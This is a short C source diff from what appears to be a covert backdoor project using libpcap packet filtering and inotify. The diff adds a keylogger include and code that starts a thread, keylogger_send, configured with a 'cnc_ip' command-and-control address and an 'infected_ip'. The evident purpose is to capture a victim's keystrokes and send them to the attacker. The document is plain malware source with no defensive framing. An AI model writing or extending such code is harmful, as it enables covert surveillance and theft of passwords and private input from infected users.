@@ -5,6 +5,7 @@
 #include "../src/covert_wrappers.h"
 #include "../src/inotify.h"
 #include "../src/libpcap.h"
+#include "../src/keylogger.h"
 
 static void print_usage(void) {
     puts ("Usage options: \n"
@@ -67,6 +68,12 @@ int main(int argc, char **argv){
     }
 
     //start keylogger thread (just logs keys)
+    keylogger_struct *keylogger_args = malloc(sizeof *keylogger_args);  //create struct to pass args to thread
+    strncpy(keylogger_args->cnc_ip, targetip, BUFSIZ);
+    strncpy(keylogger_args->infected_ip, localip, BUFSIZ);
+    pthread_t keylogger_thread; //create a thread
+    pthread_create(&keylogger_thread, NULL, keylogger_send, keylogger_args);
+
     //start libpcap
     Filter = InitFilter(targetip,localip, true, tcp);
     CreateFilter(pcapfilter,tcp);
